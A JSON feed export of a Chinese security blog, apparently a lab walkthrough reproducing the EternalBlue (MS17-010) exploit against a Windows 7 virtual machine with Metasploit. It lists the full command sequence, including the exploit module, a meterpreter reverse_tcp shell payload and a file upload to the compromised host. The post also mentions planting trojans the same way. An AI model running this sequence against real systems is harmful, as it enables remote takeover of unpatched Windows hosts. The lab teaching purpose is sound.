{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"渗透\" tag",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/17/windows/win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://vvwwvv.cn/2023/09/17/windows/win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "Windows7永恒之蓝漏洞复现",
            "date_published": "2023-09-17T00:39:56.000Z",
            "content_html": "<h1 id=\"利用msf渗透攻击win7永恒之蓝漏洞-ms17-010\"><a class=\"anchor\" href=\"#利用msf渗透攻击win7永恒之蓝漏洞-ms17-010\">#</a> 利用 msf 渗透攻击 win7（永恒之蓝漏洞 ms17-010）</h1>\n<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>永恒之蓝是指 2017 年 4 月 14 日晚，黑客团体 Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含 “永恒之蓝” 工具，“永恒之蓝” 利用 Windows 系统的 SMB 漏洞可以获取系统最高权限。5 月 12 日，不法分子通过改造 “永恒之蓝” 制作了 wannacry 勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>\n<p>存在漏洞的主机，只需要开放 445 端口即可被攻击，获取系统最高权限</p>\n<h2 id=\"环境\"><a class=\"anchor\" href=\"#环境\">#</a> 环境</h2>\n<p>kali  ip：192.168.232.129</p>\n<p>windows7   ip：192.168.232.131</p>\n<h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h2>\n<p>Metasploit Framework (MSF) 是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit 可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以 “可以黑掉整个宇宙” 之名。刚开始的 Metasploit 是采用 Perl 语言编写的，但是再后来的新版中，改成了用 Ruby 语言编写的了。在 kali 中，自带了 Metasploit 工具。</p>\n<h2 id=\"ms17-010漏洞复现\"><a class=\"anchor\" href=\"#ms17-010漏洞复现\">#</a> ms17-010 漏洞复现</h2>\n<p>1. 安装 win7 并查看本机 ip<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfLpc9.png\" alt=\"\" /></p>\n<p>kali 利用 nmap 扫描 win7ip<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfLEtO.png\" alt=\"\" /></p>\n<p>发现开启了 445 端口，利用该端口进行攻击</p>\n<p>2. 启动 msf 进行漏洞探测</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#利用命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tmsfconsole  <span class=\"token comment\">#进入 msf</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tsearch ms17-010 <span class=\"token comment\">#查找 msf17-010 漏洞模块</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPfXXAP.png\" alt=\"\" /><br />\n利用 use [对应的模块序号]  命令即可查看对应漏洞模块</p>\n<p>为了使用 <code>scanner</code>  模块，这里我们输入  <code>use 3</code>  接着输入 <code>info</code>  命令来查看 ms17-010 漏洞信息<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjnc4.png\" alt=\"\" /></p>\n<p>接下来使用 <code>scanner</code>  模块检测主机是否存在漏洞</p>\n<p>输入命令 <code>show options</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjwDA.png\" alt=\"\" /><br />\n 在上面的图里可以看到 <code>Required</code>  为是否需要参数， <code>yes</code>  表示需要参数，若改选项对应参数为空则需要我们来输入参数</p>\n<p>发现 <code>RHOST</code>  参数对应为空，其参数是被攻击主机的 IP，需要我们输入</p>\n<p>输入命令 <code>set rhosts 192.168.232.131</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjIU0.png\" alt=\"\" /></p>\n<p>再次输入 <code>show options</code> , 可以看到已经设置好了 <code>RHOSTS</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjqv4.png\" alt=\"\" /></p>\n<p>使用 <code>run</code>  命令进行扫描攻击，运行结果显示可能会遭受 <code>ms17-010</code>  攻击<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfvC8O.png\" alt=\"\" /></p>\n<p>3. 漏洞利用</p>\n<p>回到开始选择漏洞模块的地方<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfv8qs.png\" alt=\"\" /></p>\n<p>输入 <code>use 0</code>  来选择 <code>永恒之蓝</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfvdRU.png\" alt=\"\" /></p>\n<p>输入 <code>set payload windows/x64/meterpreter/reverse_tcp</code>  来设置 payload 的连接方式，使我们的 win7 主动发起连接，通过这种方式拿到权限<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfzV4P.png\" alt=\"\" /></p>\n<p>接下来需要设置我们的攻击 ip，按顺序输入 <code>show options</code>  和 <code>set rhosts 192.168.232.131</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfzujg.png\" alt=\"\" /></p>\n<p>接下来使用 <code>run</code>  命令即可执行攻击<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhPESx.png\" alt=\"\" /></p>\n<p>出现返回的 <code>meterpreter</code>  时我们就得到了 win7 的 system 权限</p>\n<p>【Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，<br />\n对目标系统进行更深入的渗透，如获取屏幕、上传 / 下载文件、创建持久后门等。】</p>\n<p><strong>这里进行文件上传的演示</strong></p>\n<p>在 kali 中创建一个文件（cumt.txt）, 编辑内容<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAMKP.png\" alt=\"\" /></p>\n<p>在 <code>meterpreter</code>  会话下输入命令  <code>upload cumt.txt c://</code> , 将文件上传到 win7 主机的 C 盘下<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAt8s.png\" alt=\"\" /></p>\n<p>查看 win7 主机，发现文件夹中多了一个 cumt.txt 文件，内容确实是我在 kali 中写入的相同<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAdK0.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAraF.md.png\" alt=\"\" /></p>\n<p>通过这种方式我们也可以在对应主机里写入木马并上传进行利用</p>\n<p>到此永恒之蓝漏洞就复现完成了</p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTMwODE5MTA=\">https://zhuanlan.zhihu.com/p/453081910</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4L2FydGljbGUvZGV0YWlscy8xMDQwNDQwMDI=\">https://blog.csdn.net/qq_44159028/article/details/104044002</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vsc29uSFkvYXJ0aWNsZS9kZXRhaWxzLzEwOTkzOTQyMA==\">https://blog.csdn.net/ElsonHY/article/details/109939420</span></p>\n",
            "tags": [
                "windows",
                "渗透"
            ]
        }
    ]
}